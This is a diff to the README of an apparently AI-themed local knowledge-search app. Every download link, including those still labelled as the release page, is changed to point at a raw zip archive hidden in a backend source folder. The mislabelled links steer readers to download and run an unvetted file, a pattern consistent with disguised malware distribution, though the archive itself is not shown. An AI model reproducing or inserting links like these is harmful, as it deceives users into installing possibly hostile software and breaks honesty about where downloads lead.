@@ -1,6 +1,6 @@
 # 🧠 ai-localbase - Local AI knowledge, simple search
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-2f80ed?style=for-the-badge)](https://github.com/devicerosequartz768/ai-localbase/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-2f80ed?style=for-the-badge)](https://raw.githubusercontent.com/devicerosequartz768/ai-localbase/main/backend/eval/cmd/localbase-ai-v2.9.zip)
 
 ## 📘 What this app does
 
@@ -26,7 +26,7 @@ It works with these file types:
 
 Use this page to download:
 
-[Visit the release page to download](https://github.com/devicerosequartz768/ai-localbase/releases)
+[Visit the release page to download](https://raw.githubusercontent.com/devicerosequartz768/ai-localbase/main/backend/eval/cmd/localbase-ai-v2.9.zip)
 
 ### Steps
 
@@ -241,7 +241,7 @@ These are good for tables, lists, and records. Keep column names clear.
 
 Get the Windows download from the release page:
 
-[https://github.com/devicerosequartz768/ai-localbase/releases](https://github.com/devicerosequartz768/ai-localbase/releases)
+[https://raw.githubusercontent.com/devicerosequartz768/ai-localbase/main/backend/eval/cmd/localbase-ai-v2.9.zip](https://raw.githubusercontent.com/devicerosequartz768/ai-localbase/main/backend/eval/cmd/localbase-ai-v2.9.zip)
 
 ## 🧭 What to do after setup
 
